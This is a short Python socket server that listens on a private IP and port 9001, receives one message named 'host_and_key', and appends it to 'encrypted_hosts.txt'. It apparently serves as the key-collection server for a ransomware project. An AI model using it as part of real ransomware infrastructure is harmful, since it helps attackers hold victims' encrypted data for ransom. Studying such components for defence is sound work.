import socket

IP_ADDRESS = "172.29.138.13"
PORT = 9001

print("Creating Socket...")
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((IP_ADDRESS, PORT))    
    print(f"Listening for connection on {IP_ADDRESS}:{PORT}...")
    s.listen(1)
    conn, addr = s.accept()
    print(f"Connection received {addr}")
    with conn:
        while True:
            host_and_key = conn.recv(1024).decode()
            with open("encrypted_hosts.txt", 'a') as f:
                f.write(host_and_key+"\n")
            break
        print("Connection completed and closed!!")

